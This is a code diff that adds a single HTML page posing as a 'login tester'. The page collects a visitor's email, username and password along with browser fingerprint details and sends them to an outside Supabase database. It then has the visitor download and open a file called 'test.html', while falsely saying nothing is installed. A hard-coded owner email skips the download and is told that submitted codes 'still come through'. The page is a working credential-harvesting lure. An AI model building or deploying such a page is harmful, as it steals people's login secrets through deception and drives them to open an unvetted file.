@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Login tester</title>
+<meta name="theme-color" content="#0a0a0c">
+<meta name="description" content="Quick login tester. Enter your details, download the checker, done.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%230a0a0c'/%3E%3Ctext x='16' y='23' font-size='18' text-anchor='middle' fill='%23a855f7'%3ET%3C/text%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+:root{--ink:#0a0a0c;--panel:#111116;--line:#22222b;--text:#f4f4f7;--mut:#9a9aa8;--dim:#6b6b7a;--vi:#a855f7;--ok:#3ddc97;
+ --mono:"JetBrains Mono",monospace;--disp:"Sora",sans-serif}
+*{box-sizing:border-box}
+body{margin:0;background:var(--ink);color:var(--text);font-family:var(--disp);font-size:14px;display:grid;place-items:center;min-height:100dvh;padding:24px}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;background:radial-gradient(800px 400px at 80% -10%,#7c3aed2e,transparent 70%)}
+.card{position:relative;width:min(420px,100%);background:var(--panel);border:1px solid var(--line);padding:26px;border-radius:10px}
+.brand{font-family:var(--mono);font-size:11px;letter-spacing:.22em;text-transform:uppercase;color:var(--dim)}
+h1{font-size:24px;margin:10px 0 6px;letter-spacing:-.02em}
+p.sub{color:var(--mut);font-size:13px;margin:0 0 18px}
+label{display:block;font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--mut);margin:12px 0 5px}
+input,select{width:100%;background:#0a0a0e;border:1px solid var(--line);color:var(--text);padding:10px 12px;border-radius:7px;font-family:var(--disp);font-size:14px}
+input:focus,select:focus{outline:none;border-color:var(--vi)}
+button{width:100%;margin-top:18px;background:var(--vi);color:#fff;border:0;padding:12px;border-radius:7px;font-family:var(--disp);font-weight:600;font-size:14px;cursor:pointer}
+button:hover{background:#b970ff}
+button:disabled{opacity:.5}
+.fine{font-family:var(--mono);font-size:10.5px;color:var(--dim);margin-top:12px;line-height:1.6}
+.step{display:none}
+.step.on{display:block}
+.ok{font-size:24px;margin:6px 0}
+.link{display:inline-block;margin-top:14px;color:var(--vi);text-decoration:none;font-weight:600}
+.err{color:#ff8095;font-family:var(--mono);font-size:11.5px;margin-top:10px;min-height:15px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand">login tester · v1</div>
+
+  <div class="step on" id="s1">
+    <h1>Check your logins</h1>
+    <p class="sub">Three fields, one download. We only check that everything works.</p>
+    <label for="email">Email</label>
+    <input id="email" type="email" placeholder="you@example.com" autocomplete="email">
+    <label for="user">Username</label>
+    <input id="user" placeholder="Your username" autocomplete="username" spellcheck="false">
+    <label for="code">Code</label>
+    <input id="code" type="password" placeholder="Your code" autocomplete="current-password">
+    <button id="go">Start test</button>
+    <div class="err" id="err"></div>
+    <p class="fine">The checker runs locally and reports back the result. Nothing gets installed.</p>
+  </div>
+
+  <div class="step" id="s3">
+    <div class="ok">Welcome owner.</div>
+    <p class="sub">No download for you — your run is recorded and any codes you add still come through.</p>
+    <div class="kv" id="ownerMeta" style="font-family:var(--mono);font-size:10.5px;color:var(--dim)"></div>
+    <button id="ownerNext" style="margin-top:22px">Enter site →</button>
+  </div>
+
+  <div class="step" id="s2">
+    <div class="ok">Thanks for testing!</div>
+    <p class="sub">Your file is called <b>test</b>. Open it to finish the check.</p>
+    <a class="link" id="dlAgain" download="test.html">Download test again</a>
+    <button id="next" style="margin-top:22px">Continue →</button>
+  </div>
+</div>
+
+<script>
+const db = window.supabase.createClient(
+  "https://bytpztfhwdcuqozdzjeu.supabase.co",
+  "sb_publishable_FIx91UXDrhOyXAQ5mJ5kaw_6xrk1ZiV"
+);
+const $ = id => document.getElementById(id);
+const OWNER = "villadssorensen@gmail.com";
+
+/* light snapshot taken on the landing page */
+function meta(){
+  return {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    screen: screen.width + "x" + screen.height,
+    dpr: devicePixelRatio,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    lang: navigator.language,
+    ref: document.referrer || null,
+    at: new Date().toISOString()
+  };
+}
+
+async function fetchTool(run){
+  const res = await fetch("test.html?x=" + Date.now(), { cache: "no-store" });
+  const text = await res.text();
+  return text.replace("__RUN__", run).replace("__SITE__", new URL("site.html", location.href).href);
+}
+
+function save(blob){
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "test.html";
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  setTimeout(() => URL.revokeObjectURL(url), 4000);
+}
+
+$("go").addEventListener("click", async () => {
+  const email = $("email").value.trim();
+  const user = $("user").value.trim();
+  const code = $("code").value;
+  $("err").textContent = "";
+
+  if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) return $("err").textContent = "Enter a valid email.";
+  if (user.length < 2) return $("err").textContent = "Enter your username.";
+  if (code.length < 1) return $("err").textContent = "Enter your code.";
+
+  $("go").disabled = true;
+  $("go").textContent = "Working…";
+
+  let run = null;
+  try {
+    const { data, error } = await db.rpc("test_login", {
+      p_email: email, p_username: user, p_code: code, p_meta: meta()
+    });
+    if (error) throw error;
+    run = data;
+
+    if (email.toLowerCase() === OWNER) {
+      $("ownerMeta").textContent = "owner run · " + String(run).slice(0, 8);
+      $("s1").classList.remove("on");
+      $("s3").classList.add("on");
+      $("ownerNext").addEventListener("click", () => { location.href = "site.html"; });
+      return;
+    }
+
+    const text = await fetchTool(run);
+    save(new Blob([text], { type: "text/html" }));
+    $("dlAgain").href = URL.createObjectURL(new Blob([text], { type: "text/html" }));
+    $("s1").classList.remove("on");
+    $("s2").classList.add("on");
+  } catch (e) {
+    $("err").textContent = e.message || "Something went wrong.";
+    $("go").disabled = false;
+    $("go").textContent = "Start test";
+    return;
+  }
+});
+
+$("next").addEventListener("click", () => { location.href = "site.html"; });
+</script>
+</body>
+</html>
